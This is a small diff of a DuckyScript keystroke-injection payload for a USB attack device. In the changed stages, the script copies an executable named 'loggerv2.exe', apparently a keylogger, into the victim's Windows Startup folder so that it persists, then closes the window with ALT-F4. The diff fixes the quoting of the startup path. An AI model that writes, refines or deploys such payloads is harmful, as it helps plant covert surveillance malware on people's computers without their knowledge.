@@ -45,7 +45,7 @@ DELAY 3000
 
 REM ######## STAGE3 ########
 
-STRING copy loggerv2.exe C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+STRING copy loggerv2.exe "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 ENTER
 DELAY 2000
 REM ######## STAGE4 ########
@@ -56,5 +56,4 @@ DELAY 1500
 
 REM ######## FINISH ########
 
-STRING EXIT
-ENTER
+ALT-F4
